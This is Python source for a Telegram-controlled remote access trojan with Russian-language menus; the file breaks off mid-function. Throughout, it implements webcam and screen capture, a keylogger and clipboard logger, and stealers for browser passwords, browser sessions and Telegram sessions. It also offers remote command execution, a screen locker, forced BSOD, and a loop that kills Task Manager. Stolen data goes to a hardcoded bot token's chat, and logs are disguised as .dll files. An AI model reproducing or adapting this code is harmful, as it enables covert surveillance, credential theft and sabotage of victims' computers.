##############################
import atexit
import base64
import chardet
import codecs
import ctypes
import ctypes
import ctypes.wintypes
import cv2
import datetime
import getpass
import GPUtil
import imageio
import imagezmq
import io
import json
import keyboard
import keyboard as kb
import logging
import mimetypes
import mouse
import mss
import numpy
import numpy as np
import os
import pathlib
import pickle
import PIL
import PIL.ImageGrab
import PIL.Image
import platform
import psutil
import psutil
import pyaudio
import pyautogui
import pygetwindow
import pygetwindow as gw
import pyperclip
import pyrdp
import pythoncom
import random
import rarfile
import re
import requests
import rotatescreen
import shutil
import socket
import sounddevice as sd
import sqlite3
import string
import struct
import subprocess
import sys
import telebot
import tempfile
import threading
import time
import tkinter as tk
import traceback
import urllib.parse
import urllib.request
import uuid
import websockets
import webbrowser
import wget
import win32api
import win32con
import win32gui
import win32evtlog
import win32evtlogutil
import win32security
import win32net
import win32netcon
import win32service
import win32serviceutil
import winreg
import wmi
import zipfile
import zlib
##############################
from Crypto.Cipher import AES
from ctypes import windll
from datetime import datetime, timedelta
from flask import Flask, Response
from flask import Flask, render_template_string
from functools import partial
from io import BytesIO
from mimetypes import guess_extension
from mitmproxy import http
from mss import mss
from pathlib import Path
from PIL import Image
from PIL import Image, ImageGrab, ImageDraw, ImageTk
from PIL import ImageFilter
from pynput import mouse, keyboard
from pynput import keyboard as pynput_keyboard
from pynput.keyboard import Key
from pynput.keyboard import Listener
from pynput.mouse import Controller
from pynput.mouse import Controller as MouseController
from PyQt5.QtGui import QPixmap, QImage
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QWidget
from PyQt5.QtWidgets import QMessageBox as MessageBox
from pySmartDL import SmartDL
from screeninfo import get_monitors
from slugify import slugify
from telebot import apihelper
from telebot import TeleBot
from telebot import types
from telebot.types import Message
from telegram import Bot
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
from threading import Thread
from tkinter import *
from tkinter import messagebox
from urllib import request
from urllib.parse import unquote
from urllib.parse import urlparse
from win32crypt import CryptUnprotectData
##############################

my_id = 7138590083
bot_token = '7696684899:AAGegCUgRnr_bRok8WiOV5DkhY0Z-UKPP0g'
bot = telebot.TeleBot(bot_token)

#Клавиатура меню
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False,one_time_keyboard=False)
btnscreen = types.KeyboardButton('🖼 Скриншоты')
btnmouse = types.KeyboardButton('🖱 Управление мышкой и клавиатурой')
btnfiles = types.KeyboardButton('📂 Файлы и процессы')
btnaddit = types.KeyboardButton('❇️ Дополнительно')
btngrab = types.KeyboardButton('🔍 Стиллер')
btn_board = types.KeyboardButton('🖥 Рабочий стол')
btn_rape = types.KeyboardButton('🔞 Изнасилование')
btntastkiller = types.KeyboardButton('❌ TASKKILLER [v1.0]')
bntloggers = types.KeyboardButton('📒 LOGGERS')
menu_keyboard.row(btnscreen, btnmouse, btn_board)
menu_keyboard.row(btnfiles, btngrab, btnaddit)
menu_keyboard.row(btn_rape, btntastkiller, bntloggers)

#Клавиатура скриншотов   
screenshot_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False)
screenshot_keyboard.add("📷 Быстрый скриншот", "🖼 Полный скриншот", "📹 Фото вебкамеры")
screenshot_keyboard.add("⏪ Назад")

#Клавиатура Файлы и Процессы
files_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False,one_time_keyboard=False)
btnallcomp = types.KeyboardButton('🖥 Все авторизованные компьютеры')
btnstart = types.KeyboardButton('✅ Запустить файл')
btnkill = types.KeyboardButton('❌ Уничтожить процесс')
btndown = types.KeyboardButton('⬇️ Скачать файл с компьютера')
btnupl = types.KeyboardButton('⬆️ Загрузить файл на компьютер')
btnurldown = types.KeyboardButton('🔗 Загрузить по ссылке')
btnback = types.KeyboardButton('⏪ Назад')
btnlistprocesses = types.KeyboardButton('📋 Список процессов')
files_keyboard.row(btnallcomp)
files_keyboard.row(btnlistprocesses, btnstart,  btnkill)
files_keyboard.row(btnurldown, btndown, btnupl, btnback)

#Клавиатура Дополнительно
additionals_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False,one_time_keyboard=False)
btncmd = types.KeyboardButton('✅ Выполнить команду')
btnoff = types.KeyboardButton('⛔️ Выключить компьютер')
btnreb = types.KeyboardButton('♻️ Перезагрузить компьютер')
btnuschange = types.KeyboardButton('👨‍💻 Сменить пользователя')
btnusexit = types.KeyboardButton('⚠️ Выйти из системы')
btninfo = types.KeyboardButton('💻 О компьютере')
btnback = types.KeyboardButton('⏪ Назад')
btndir = types.KeyboardButton('🗂 dir /b')
btnmsgbox = types.KeyboardButton('📩 Отправка уведомления')
btn_search = types.KeyboardButton('🔗 Перейти по ссылке')
additionals_keyboard.row(btnoff, btnreb, btnuschange, btnusexit)
additionals_keyboard.row(btncmd, btndir, btnmsgbox)
additionals_keyboard.row(btninfo, btn_search, btnback)

#Клавиатура мыши и клавиатуры
mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnback = types.KeyboardButton('⏪ Назад')
btnblock = types.KeyboardButton('🚫 Блокировать мышь')
btnunblock = types.KeyboardButton('✅ Разблокировать мышь')
btnmrandom = types.KeyboardButton('💥 Рандом курсор')
mouse_keyboard.row(btnblock, btnunblock)
mouse_keyboard.row(btnmrandom)
mouse_keyboard.row(btnback)

# Клавиатура "Стиллера"
grabber_submenu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btn_photo = types.KeyboardButton('🖼 Граббер фото')
btn_video = types.KeyboardButton('🎥 Граббер видео')
btn_music = types.KeyboardButton('🎶 Граббер музыки')
btn_archives = types.KeyboardButton('📦 Граббер архивов')
btn_txts = types.KeyboardButton('📄 Граббер txt')
btninstalledprograms = types.KeyboardButton('📦 Установленные программы')
btngtsteal = types.KeyboardButton('🛩 Граббер сессий Telegram')
btngbrowsersteal = types.KeyboardButton('😈 Стиллер браузеров')
btngbrowsersession = types.KeyboardButton('👿 Сессии браузеров')
btnstealallmedia = types.KeyboardButton('💾 Граббер всех файлов')
btnback = types.KeyboardButton('⏪ Назад')
grabber_submenu_keyboard.row(btn_photo, btn_video, btn_music)
grabber_submenu_keyboard.row(btn_archives, btn_txts, btninstalledprograms)
grabber_submenu_keyboard.row(btnstealallmedia, btngtsteal, btngbrowsersteal, btngbrowsersession)
grabber_submenu_keyboard.row(btnback)

#Клавиатура рабочего стола
vnc_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
start_recording_button = types.KeyboardButton('🔴 Начать запись экрана')
stop_recording_button = types.KeyboardButton('⏹️ Завершить запись экрана')
btnset_wallpaper = types.KeyboardButton('🌅 Изменить обои')
btnrms = types.KeyboardButton('🖥 Запустить RMS')
btnspht = types.KeyboardButton('📋 Скрыть панель задач')
btnback = types.KeyboardButton('⏪ Назад')
vnc_keyboard.row(start_recording_button, stop_recording_button)
vnc_keyboard.row(btnset_wallpaper, btnrms, btnspht)
vnc_keyboard.row(btnback)

#Клавиатура насилие
rape_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnwinlock = types.KeyboardButton('🔒 Вин-локер')
btnbsod = types.KeyboardButton('🔵 BSOD')
btnwowscreen = types.KeyboardButton('🌊 Плывущий экран')
btnrotatescreen = types.KeyboardButton('🔄 Перевертыш экрана')
btnwindowimage = types.KeyboardButton('🖼 Картинка-локер')
btnback = types.KeyboardButton('⏪ Назад')
rape_keyboard.row(btnwinlock, btnbsod, btnwowscreen)
rape_keyboard.row(btnrotatescreen, btnwindowimage,)
rape_keyboard.row(btnback)

#Клавиатура TASKKILLER
task_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnlistexittaskmng = types.KeyboardButton('📈 Запретить диспетчер задач')
btnnolistexittaskmng = types.KeyboardButton('📉 Разрешить диспетчер задач')
btnlistexitprocces = types.KeyboardButton('➕ Запретить процесс')
btnlistnoexitprocces = types.KeyboardButton('➖ Разрешить процесс')
btnlistprocess = types.KeyboardButton('🚫 Все запрещенные процессы')
btnnoexitallprocess = types.KeyboardButton('✅ Разрешить все процессы')
btnback = types.KeyboardButton('⏪ Назад')
task_keyboard.row(btnlistexittaskmng, btnnolistexittaskmng)
task_keyboard.row(btnlistexitprocces, btnlistnoexitprocces, btnlistprocess, btnnoexitallprocess)
task_keyboard.row(btnback)

#Клавиатура логгеров
log_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=False, one_time_keyboard=False)
btnback = types.KeyboardButton('⏪ Назад')
btnfileloggerstart = types.KeyboardButton("✅️🗂 Запустить файллоггер")
btnfileloggerend = types.KeyboardButton("⛔️🗂 Остановить файллоггер")
btnfileloggersend = types.KeyboardButton("📨🗂 Отправить логи")
btnprocloggerstart = types.KeyboardButton("✅️🗃 Запустить тасклоггер")
btnprocloggerend = types.KeyboardButton("⛔️🗃 Остановить тасклоггер")
btnprocloggersend = types.KeyboardButton("✅🗃 Отправить логи")
btncliploggerstart = types.KeyboardButton("✅️🧷 Запустить клиплоггер")
btncliploggerend = types.KeyboardButton("⛔️🧷 Остановить клиплоггер")
btncliploggersend = types.KeyboardButton("✅🧷 Отправить логи")
log_keyboard.row(btnfileloggerstart, btnfileloggerend, btnfileloggersend)
log_keyboard.row(btnprocloggerstart, btnprocloggerend, btnprocloggersend)
log_keyboard.row(btncliploggerstart, btncliploggerend, btncliploggersend)
log_keyboard.row(btnback)

# Общий обработчик кнопок
@bot.message_handler(content_types=["text"])    
def get_text_messages(message):
    if message.from_user.id == my_id:
        logging.basicConfig(filename='bot.log', level=logging.DEBUG)
        logger = logging.getLogger()
        logger.info(f"Received message: {message.text}")
        if message.text == "🖼 Скриншоты":
            bot.send_message(my_id, "Выберите тип скриншота:", reply_markup=screenshot_keyboard)
        elif message.text == "📷 Быстрый скриншот":
            perform_quick_screenshot(message)
        elif message.text == "🖼 Полный скриншот":
            bot.send_chat_action(my_id, 'upload_document')
            screenshot_file = get_screenshot()
            if screenshot_file:
                bot.send_document(my_id, open(screenshot_file, "rb"))
                os.remove(screenshot_file)
            else:
                bot.send_message(my_id, "Ошибка при снятии скриншота: " + screenshot_file)
        elif message.text == "📹 Фото вебкамеры":
            bot.send_chat_action(my_id, 'upload_photo')
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cv2.imwrite('webcam.png', frame)
                cap.release()
                bot.send_photo(my_id, open("webcam.png", "rb"))
                os.remove("webcam.png")
            except Exception as e:
                bot.send_message(my_id, "Ошибка при снятии фото с вебкамеры: " + str(e))
        elif message.text == "🖱 Управление мышкой и клавиатурой":
            bot.send_message(my_id, "🖱 Управление мышкой и клавиатурой", reply_markup = mouse_keyboard)
            bot.register_next_step_handler(message, mouse_process)
        elif message.text == "🖥 Рабочий стол":
            bot.send_message(my_id, "Выберите действие:", reply_markup=vnc_keyboard) 
        elif message.text == "🔴 Начать запись экрана":
            start_recording_command(message)
            bot.send_message(message.chat.id, "Запись экрана начата. Запись автоматически завершится по истечении 2 минут.")
        elif message.text == "⏹️ Завершить запись экрана":
            stop_recording_command(message)
            bot.send_message(message.chat.id, "Запись экрана завершена.")
        elif message.text == "🌅 Изменить обои":
            set_wallpaper_command(message)
        elif message.text == "🖥 Запустить RMS":
            agent_screenshot(message)
        elif message.text == "📋 Скрыть панель задач":
            start_taskbar_hide(message)
        elif message.text == "📂 Файлы и процессы":
            bot.send_message(my_id, "📂 Файлы и процессы", reply_markup = files_keyboard)
            bot.register_next_step_handler(message, files_process)
        elif message.text == "🔍 Стиллер":
            bot.send_message(my_id, "Выберите действие:", reply_markup=grabber_submenu_keyboard)
        elif message.text == "💾 Граббер всех файлов":
            perform_grab_photos(message)
            perform_grab_video(message)
            perform_grab_music(message)
            perform_grab_arch(message)
            perform_grab_txt(message)
        elif message.text == "🖼 Граббер фото":
            perform_grab_photos(message)
        elif message.text == "🎥 Граббер видео":
            perform_grab_video(message)
        elif message.text == "🎶 Граббер музыки":
            perform_grab_music(message)
        elif message.text == "📦 Граббер архивов":       
            perform_grab_arch(message)
        elif message.text == "📄 Граббер txt":
            perform_grab_txt(message)
        elif message.text == "📦 Установленные программы":
            send_installed_programs_as_document(message)
        elif message.text == "🛩 Граббер сессий Telegram":
            grab_and_upload_telegram_session(message)
        elif message.text == "😈 Стиллер браузеров":
            handle_browsers_info_command(message)
        elif message.text == "👿 Сессии браузеров":
            copy_browsers_data(message)
        elif message.text == "❇️ Дополнительно":
            bot.send_message(my_id, "❇️ Дополнительно", reply_markup = additionals_keyboard)
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "🔞 Изнасилование":
            bot.send_message(my_id, "Выберите действие:", reply_markup=rape_keyboard)
        elif message.text == "🔒 Вин-локер":
            start_winlock(message)
        elif message.text == "🔵 BSOD":
            trigger_bsod(message)
            bot.send_message(my_id, "Выберите действие:", reply_markup=rape_keyboard)
        elif message.text == "🌊 Плывущий экран":
            start_wowscreen(message)
        elif message.text == "🔄 Перевертыш экрана":
            rotatescreen_process(message)
            bot.send_message(my_id, "Выберите действие:", reply_markup=rape_keyboard)
        elif message.text == "🖼 Картинка-локер":
            windowimage(message)
        elif message.text == "❌ TASKKILLER [v1.0]":
            bot.send_message(my_id, "❌ TASKKILLER", reply_markup = task_keyboard)
            bot.register_next_step_handler(message, taskis_keyboard)
        elif message.text == "📒 LOGGERS":
            bot.send_message(my_id, "📒 LOGGERS", reply_markup = log_keyboard)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "⏪ Назад": 
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def logger_keyboard(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "✅️🗂 Запустить файллоггер":
            activate_filelogger()
            bot.send_message(message.chat.id, "Файллоггер включен.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "⛔️🗂 Остановить файллоггер":
            deactivate_filelogger()
            bot.send_message(message.chat.id, "Файллоггер выключен.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "📨🗂 Отправить логи":
            file_send_logs(my_id, log_file_path, bot)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "✅️🗃 Запустить тасклоггер":
            start_process_logger()
            bot.send_message(message.chat.id, "Тасклоггер включен.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "⛔️🗃 Остановить тасклоггер":
            bot.send_message(message.chat.id, "Тасклоггер выключен.")
            stop_process_logger()
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "✅🗃 Отправить логи":
            task_send_logs(my_id, log_task_path, bot)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "✅️🧷 Запустить клиплоггер":
            start_clipboard_logging()
            bot.send_message(message.chat.id, "Клиплоггер включен.")
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "⛔️🧷 Остановить клиплоггер":
            bot.send_message(message.chat.id, "Клиплоггер выключен.")
            stop_clipboard_logging()
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "✅🧷 Отправить логи":
            clip_send_logs(my_id, log_clipboard_path, bot)
            bot.register_next_step_handler(message, logger_keyboard)
        elif message.text == "⏪ Назад":
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def taskis_keyboard(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "📈 Запретить диспетчер задач":
            start_scan_taskmgr(message)
            bot.register_next_step_handler(message, taskis_keyboard)
        elif message.text == "📉 Разрешить диспетчер задач":
            stop_scan_taskmgr(message)
            bot.register_next_step_handler(message, taskis_keyboard)
        elif message.text == "➕ Запретить процесс":
            bot.register_next_step_handler(message, ask_for_process_name)
        elif message.text == "➖ Разрешить процесс":
            bot.register_next_step_handler(message, ask_for_process_removal)
        elif message.text == "🚫 Все запрещенные процессы":
            start_scan_processes(message)
        elif message.text == "✅ Разрешить все процессы":
            stop_scan_processes(message)
        elif message.text == "⏪ Назад":
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def addons_process(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "✅ Выполнить команду":
            bot.send_message(my_id, "Укажите консольную команду:")
            bot.register_next_step_handler(message, cmd_process)
        elif message.text == "⛔️ Выключить компьютер":
            bot.send_message(my_id, "Выключение компьютера...")
            os.system('shutdown -s /t 0 /f')
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "♻️ Перезагрузить компьютер":
            bot.send_message(my_id, "Перезагрузка компьютера...")
            os.system('shutdown -r /t 0 /f')
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "👨‍💻 Сменить пользователя":
            bot.send_message(my_id, "Смена пользователя...")
            os.system('tsdiscon')
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "⚠️ Выйти из системы":
            bot.send_message(my_id, "Выход из системы...")
            os.system('shutdown -l')
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "💻 О компьютере":
            bot.send_message(my_id, "Начинаю поиск информации о компьютере...\nЧерез пару минут информация будет готова.")
            computer_info = get_computer_info()
            send_computer_info(message)
            bot.register_next_step_handler(message, addons_process)  
        elif message.text == "🗂 dir /b":
            get_directory_listing(message)
        elif message.text == "📩 Отправка уведомления":
            bot.send_message(my_id, "Укажите текст уведомления:")
            bot.register_next_step_handler(message, messaga_process)
        elif message.text == "🔗 Перейти по ссылке":
            bot.send_message(my_id, "Введите название браузера и ссылку в формате: браузер ссылка. Например: chrome https://example.com. Поддерживаемые браузеры: opera, yandex, chrome, firefox, edge, brave.")
            bot.register_next_step_handler(message, process_link_browser)
        elif message.text == "⏪ Назад":
            back(message)
        else:
            info_user(message)
@bot.message_handler(func=lambda message: True)
def files_process(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "❌ Уничтожить процесс":
            bot.send_message(message.chat.id, "Введите название процесса, который вы хотите завершить:")
            bot.register_next_step_handler(message, kill_process)
        elif message.text == "🖥 Все авторизованные компьютеры":
            list_registered_computers()
        elif message.text == "✅ Запустить файл":
            bot.send_message(my_id, "Укажите путь до файла: ")
            bot.register_next_step_handler(message, start_process)
        elif message.text == "⬇️ Скачать файл с компьютера":
            bot.send_message(my_id, "Отправьте расположение файла:")
            bot.register_next_step_handler(message, downfile_process)
        elif message.text == "⬆️ Загрузить файл на компьютер":
            bot.send_message(my_id, "Отправьте необходимый файл")
            bot.register_next_step_handler(message, uploadfile_process)
        elif message.text == "🔗 Загрузить по ссылке":
            bot.send_message(message.chat.id, "Укажите прямую ссылку на файл (инструкция vk.cc/cqTRtN). Максимальный вес файла - 1 ГБ")
            bot.register_next_step_handler(message, process_download)
        elif message.text == "📋 Список процессов":
            send_process_list(message)
        elif message.text == "⏪ Назад":
            back(message)
        else:
            info_user(message)
            
            
            
#обработчик клавиатуры мыши
@bot.message_handler(func=lambda message: True)
def mouse_process(message):
    global mouse_locked
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "🚫 Блокировать мышь":
            mouse_locked = True
            threading.Thread(target=lock_mouse).start()
            bot.send_message(my_id, "Мышь заблокирована")
            bot.register_next_step_handler(message, mouse_process)
        elif message.text == "✅ Разблокировать мышь":
            mouse_locked = False
            bot.send_message(my_id, "Мышь разблокирована")
            bot.register_next_step_handler(message, mouse_process)
        elif message.text == "💥 Рандом курсор":
            start_random_mouse(message)
        elif message.text == "⏪ Назад":
            back(message)
        else:
            info_user(message)
#####################################################
registered_computers = {} # В начале скрипта создаем словарь для хранения информации о компьютерах
def register_computer(): # Функция для регистрации компьютера
    computer_name = platform.node()  # Имя компьютера
    ip_address = socket.gethostbyname(socket.gethostname())  # IP-адрес компьютера
    registered_computers[computer_name] = ip_address
def get_registered_computers(): # Функция для получения списка зарегистрированных компьютеров
    return registered_computers
def send_computer_info_bot(): # Ваша функция send_computer_info_bot() теперь будет такой:
    computer_name = platform.node()  # Имя компьютера
    ip_address = socket.gethostbyname(socket.gethostname())  # IP-адрес компьютера
    bot.send_message(my_id, f"Бот авторизирован на компьютере {computer_name} с IP-адресом {ip_address}")
    register_computer()
def list_registered_computers(): # Далее, если вам нужна функция для вывода списка зарегистрированных компьютеров, то она будет такой:
    computers = get_registered_computers()
    if computers:
        message = "Зарегистрированные компьютеры:\n"
        for computer, ip in computers.items():
            message += f"{computer} - {ip}\n"
        bot.send_message(my_id, message)
    else:
        bot.send_message(my_id, "На данный момент зарегистрированных компьютеров нет.")
######################################################
################CLIPBOARDLOGGER [v1.0]################
log_clipboard_path = "tempclip.dll"  # Путь к файлу логов буфера обмена
last_clipboard_data = ""
logging_enabled = False  # Флаг для включения/выключения логирования
def clear_log_file(file_path): # Функция для очистки файла с логами
    try:
        os.remove(file_path)  # Удалить существующий файл логов
    except FileNotFoundError:
        pass
def log_clipboard(log_clipboard_path): # Функция для записи данных из буфера обмена в файл логов
    global last_clipboard_data, logging_enabled
    clear_log_file(log_clipboard_path)  # Очистить файл с логами перед началом логирования
    while logging_enabled:
        clipboard_data = pyperclip.paste().strip()  # Получить данные из буфера обмена и удалить лишние пробелы
        if clipboard_data and clipboard_data != last_clipboard_data:
            if not clipboard_data.isspace():  # Добавляем проверку на пустые строки
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")  # Получить текущее время
                formatted_data = f"[{timestamp}]\n{clipboard_data}"  # Форматировать данные с временем и []
                with open(log_clipboard_path, "a", encoding='utf-8') as log_file:
                    log_file.write(f"Скопировано из буфера обмена: {formatted_data}\n____________________________\n")
                last_clipboard_data = clipboard_data
        time.sleep(1)  # Интервал проверки буфера обмена (в секундах)
def start_clipboard_logging(): # Функция для старта логирования
    global logging_enabled
    if not logging_enabled:
        logging_enabled = True
        threading.Thread(target=log_clipboard).start()
def stop_clipboard_logging(): # Функция для остановки логирования
    global logging_enabled
    logging_enabled = False
def clip_send_logs(my_id, log_clipboard_path, bot):
    try:
        with open(log_clipboard_path, 'rb') as log_file:
            bot.send_document(my_id, log_file)
            bot.send_message(my_id, "Логи отправлены.")
    except Exception as e:
        bot.send_message(my_id, f"Ошибка при отправке файла: {str(e)}.\nПопробуйте еще раз или перезапустите клиплоггер.")
#####################################################

#################TASKLOGGER [v1.2]###################
log_task_path = "tempprocess.dll"  # Название файла логов
known_processes = set()
lock = threading.Lock()
monitor_thread_process = None 
def is_windows_process(process):
    try:
        return 'Windows' in process.name()
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False
def clear_log_file_process(): # Функция для очистки файла логов
    try:
        os.remove(log_task_path)  # Удаляем существующий файл логов
    except FileNotFoundError:
        pass
def monitor_processes(): # Функция для мониторинга процессов
    global known_processes
    while True:
        with lock:
            current_processes = set([p.name() for p in psutil.process_iter() if not is_windows_process(p)])
            new_processes = current_processes - known_processes
            known_processes.update(new_processes)
        if new_processes:
            with open(log_task_path, "a", encoding='utf-8') as log_file:
                for process_name in new_processes:
                    log_file.write(f"Новый процесс запущен: {process_name}\n")
        time.sleep(5)  # Интервал проверки новых процессов (в секундах)
def start_process_logger(): # Функция для включения логгера процессов
    global monitor_thread_process
    clear_log_file_process()  # Очищаем файл с логами перед началом логирования
    monitor_thread_process = threading.Thread(target=monitor_processes)  # Запустить функцию мониторинга в отдельном потоке
    monitor_thread_process.start()
def stop_process_logger(): # Функция для отключения логгера процессов
    global monitor_thread_process
    if monitor_thread_process is not None:
        monitor_thread_process.join()  # Ожидать завершения потока мониторинга
def task_send_logs(my_id, log_task_path, bot):
    try:
        with open(log_task_path, 'rb') as log_file:
            bot.send_document(my_id, log_file)
            bot.send_message(my_id, "Логи отправлены.")
    except Exception as e:
        bot.send_message(my_id, f"Ошибка при отправке файла: {str(e)}.\nПопробуйте еще раз или перезапустите тасклоггер.")
#####################################################


##################FILELOGGER [v1.4]##################
filelogger_active = False
folders_to_monitor_file = [ # Папки, которые будем мониторить
    os.path.expanduser("~\Downloads"),
    os.path.expanduser("~\Desktop"),
    os.path.expanduser("~\Pictures"),
    os.path.expanduser("~\Music"),
    os.path.expanduser("~\Videos"),
    os.path.expanduser("~\Documents")
]
log_file_path = "temp1.dll" # Путь к файлу файллоггера
last_check_time = time.time() # Инициализируем время последней проверки
def monitor_folders(): #Функция файллоггера
    global last_check_time
    while True:
        for folder in folders_to_monitor_file:
            for filename in os.listdir(folder):
                file_path = os.path.join(folder, filename)
                if os.path.isfile(file_path) and os.path.getctime(file_path) > last_check_time: # Проверяем, является ли элемент файлом и новым
                    with open(log_file_path, "a") as log_file:
                        log_file.write(f"Найден новый файл: {file_path}\n") # Записываем информацию о новом файле в журнал
                    bot.send_message(my_id, f"[FILELOGGER]\nНайден новый файл: {file_path}") # Отправляем уведомление о найденном файле
        last_check_time = time.time() # Обновляем время последней проверки
        time.sleep(2) # Пауза между проверками (в секундах)
def activate_filelogger():
    global filelogger_active
    if not filelogger_active:
        filelogger_active = True
        threading.Thread(target=monitor_folders).start()
def deactivate_filelogger():
    global filelogger_active
    filelogger_active = False
def file_send_logs(my_id, log_file_path, bot):
    try:
        with open(log_file_path, 'rb') as log_file:
            bot.send_document(my_id, log_file)
            bot.send_message(my_id, "Логи отправлены.")
    except Exception as e:
        bot.send_message(my_id, f"Ошибка при отправке файла: {str(e)}.\nПопробуйте еще раз или перезапустите файллоггер.")  
#####################################################

###################KEYLOGGER [v1.0]##################
class KeyLogger():
    def __init__(self, filename: str = "temp2.dll") -> None:
        self.filename = filename
        self.bracket_count = 0  # Счетчик пар в квадратных скобках
        self.last_log_time = None
    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)
    def on_press(self, key):
        char = self.get_char(key)
        with open(self.filename, 'a') as logs:
            current_time = time.time() # Проверяем время с момента последней записи
            if self.last_log_time is None or (current_time - self.last_log_time) > 60:
                logs.write(f"\n[Логирование началось {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
                self.last_log_time = current_time
            logs.write(f"[{char}]")
            self.bracket_count += 1
            if self.bracket_count >= 100:
                logs.write('\n')
                self.bracket_count = 0
                self.last_log_time = current_time
    def run(self):
        try: # Проверяем, существует ли уже файл логов, и если да, удаляем его
            open(self.filename, 'r')
            os.remove(self.filename)
        except FileNotFoundError:
            pass
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()
        listener.join()
#####################################################

##################TASKKILLER [v1.0]##################
scan_processes = []  # Список процессов для отслеживания
def check_processes(message=None): #Функция сканирования процессов
    global scan_processes
    while True:
        for process_name in scan_processes:
            for process in psutil.process_iter(attrs=['pid', 'name']):
                if process.info['name'] == process_name:
                    try:
                        p = psutil.Process(process.info['pid'])
                        p.terminate()
                        if message:
                            bot.send_message(message.chat.id, f"[TASKKILLER]\n\nПроцесс {process_name} был найден и принудительно завершен.")
                    except psutil.NoSuchProcess:
                        pass
        time.sleep(15)
process_thread = threading.Thread(target=check_processes)
def start_scan_processes(message=None): #Список всех запрещенных процессов
    global process_thread
    if not process_thread.is_alive():
        process_thread = threading.Thread(target=check_processes, args=(message,))
        process_thread.start()
        if message:
            bot.send_message(message.chat.id, f"[TASKKILLER]\n\nСканирование запущено для следующих процессов: {', '.join(scan_processes)}")
            bot.register_next_step_handler(message, files_process)
def stop_scan_processes(message=None): #Разрешить все процессы
    global process_thread
    process_thread.join()
    if message:
        bot.send_message(message.chat.id, "[TASKKILLER]\n\nСканирование остановлено.")
        bot.register_next_step_handler(message, files_process)
def add_process_to_track(message, process_name): #Запретить процесс
    global scan_processes
    scan_processes.append(process_name)
    if message:
        bot.send_message(message.chat.id, f"[TASKKILLER]\n\nПроцесс {process_name} добавлен для отслеживания. Текущие отслеживаемые процессы: {', '.join(scan_processes)}")
        bot.register_next_step_handler(message, files_process)
def remove_process_to_track(message, process_name): #Разрешить процесс
    global scan_processes
    if process_name in scan_processes:
        scan_processes.remove(process_name)
        bot.send_message(message.chat.id, f"[TASKKILLER]\n\nПроцесс {process_name} удален из отслеживания. Текущие отслеживаемые процессы: {', '.join(scan_processes)}")
        bot.register_next_step_handler(message, files_process)
    else:
        bot.send_message(message.chat.id, f"[TASKKILLER]\n\nПроцесс {process_name} не был в списке отслеживаемых.")
        bot.register_next_step_handler(message, files_process)
def ask_for_process_name(message): # Функция для запроса пользователя о процессе
    bot.send_message(message.chat.id, "[TASKKILLER]\n\nВведите название процесса для отслеживания:")
    bot.register_next_step_handler(message, process_name_input)
def process_name_input(message): # Функция для обработки ввода пользователем названия процесса
    process_name = message.text.strip()
    if process_name:
        add_process_to_track(message, process_name)
        bot.register_next_step_handler(message, files_process)
    else:
        bot.send_message(message.chat.id, "[TASKKILLER]\n\nНазвание процесса не может быть пустым.")
        bot.register_next_step_handler(message, files_process)
def ask_for_process_removal(message): # Функция для запроса пользователя об удалении процесса
    bot.send_message(message.chat.id, "[TASKKILLER]\n\nВведите название процесса для удаления из отслеживания:")
    bot.register_next_step_handler(message, process_removal_input)
def process_removal_input(message): # Функция для обработки ввода пользователем названия процесса для удаления
    process_name = message.text.strip()
    if process_name:
        remove_process_to_track(message, process_name)
        bot.register_next_step_handler(message, files_process)
    else:
        bot.send_message(message.chat.id, "[TASKKILLER]\n\nНазвание процесса не может быть пустым.")
        bot.register_next_step_handler(message, files_process)
scan_taskmgr = True
def check_taskmgr(message=None): # Функция для сканирования
    global scan_taskmgr
    while scan_taskmgr:
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'Taskmgr.exe':
                try:
                    p = psutil.Process(process.info['pid'])
                    p.terminate()
                    if message:
                        bot.send_message(message.chat.id, "[TASKKILLER] Процесс Taskmgr.exe был найден и принудительно завершен.")
                except psutil.NoSuchProcess:
                    pass
        time.sleep(3)
